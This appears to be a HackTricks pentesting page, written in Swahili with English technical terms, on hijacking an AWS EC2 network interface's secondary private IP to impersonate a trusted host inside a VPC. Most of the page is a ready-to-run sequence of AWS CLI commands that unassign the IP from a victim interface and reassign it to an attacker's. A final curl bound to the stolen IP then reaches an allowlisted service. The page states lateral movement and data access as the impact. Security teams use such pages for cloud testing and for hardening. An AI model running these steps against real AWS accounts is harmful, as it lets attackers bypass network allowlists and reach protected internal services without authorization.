# AWS â€“ EC2 ENI Secondary Private IP Hijack (Trust/Allowlist Bypass)

{{#include ../../../../banners/hacktricks-training.md}}

Tumia vibaya `ec2:UnassignPrivateIpAddresses` na `ec2:AssignPrivateIpAddresses` kuiba secondary private IP ya ENI ya mwathiriwa na kuhamisha kwa ENI ya mwavamizi katika subnet/AZ ileile. Huduma nyingi za ndani na security groups huweka ufikiaji kwa private IP maalum. Kwa kuhamisha anwani hiyo ya secondary, mwavamizi anajifanya kama mwenyeji aliyeaminika kwa L3 na anaweza kufikia allowlisted services.

Prereqs:
- Ruhusa: `ec2:DescribeNetworkInterfaces`, `ec2:UnassignPrivateIpAddresses` kwenye ARN ya ENI ya mwathiriwa, na `ec2:AssignPrivateIpAddresses` kwenye ARN ya ENI ya mwavamizi.
- ENI zote mbili lazima ziwe katika subnet/AZ ileile. Anwani lengwa lazima iwe secondary IP (primary haiwezi kuondolewa).

Variables:
- REGION=us-east-1
- VICTIM_ENI=<eni-xxxxxxxx>
- ATTACKER_ENI=<eni-yyyyyyyy>
- PROTECTED_SG=<sg-protected>   # SG on a target service that allows only $HIJACK_IP
- PROTECTED_HOST=<private-dns-or-ip-of-protected-service>

Steps:
1) Chagua secondary IP kutoka kwa ENI ya mwathiriwa
```bash
aws ec2 describe-network-interfaces --network-interface-ids $VICTIM_ENI --region $REGION   --query NetworkInterfaces[0].PrivateIpAddresses[?Primary==`false`].PrivateIpAddress --output text | head -n1 | tee HIJACK_IP
export HIJACK_IP=$(cat HIJACK_IP)
```
2) Hakikisha protected host inaruhusu IP hiyo tu (idempotent). Ikiwa unatumia SG-to-SG rules badala yake, ruka.
```bash
aws ec2 authorize-security-group-ingress --group-id $PROTECTED_SG --protocol tcp --port 80   --cidr "$HIJACK_IP/32" --region $REGION || true
```
3) Msingi: kutoka kwenye instance ya mshambuliaji, ombi kwa PROTECTED_HOST inapaswa kushindikana bila chanzo kilichodanganywa (kwa mfano, kupitia SSM/SSH)
```bash
curl -sS --max-time 3 http://$PROTECTED_HOST || true
```
4) Ondoa IP ya pili kutoka kwa ENI ya mwathiriwa
```bash
aws ec2 unassign-private-ip-addresses --network-interface-id $VICTIM_ENI   --private-ip-addresses $HIJACK_IP --region $REGION
```
5) Peana IP ile ile kwa attacker ENI (on AWS CLI v1 add `--allow-reassignment`)
```bash
aws ec2 assign-private-ip-addresses --network-interface-id $ATTACKER_ENI   --private-ip-addresses $HIJACK_IP --region $REGION
```
6) Thibitisha umiliki umehamishwa
```bash
aws ec2 describe-network-interfaces --network-interface-ids $ATTACKER_ENI --region $REGION   --query NetworkInterfaces[0].PrivateIpAddresses[].PrivateIpAddress --output text | grep -w $HIJACK_IP
```
7) Kutoka kwa attacker instance, source-bind kwenye hijacked IP ili kufikia protected host (hakikisha IP imewekwa kwenye OS; ikiwa siyo, iiongeze kwa `ip addr add $HIJACK_IP/<mask> dev eth0`)
```bash
curl --interface $HIJACK_IP -sS http://$PROTECTED_HOST -o /tmp/poc.out && head -c 80 /tmp/poc.out
```
## Athari
- Kupita kando allowlists za IP na kujiga mwenyeji aliyeaminika ndani ya VPC kwa kuhamisha secondary private IPs kati ya ENIs ndani ya subnet/AZ ile ile.
- Kufikia huduma za ndani ambazo zinazuia upatikanaji kwa source IPs maalum, hivyo kuwezesha lateral movement na upatikanaji wa data.
{{#include ../../../../banners/hacktricks-training.md}}
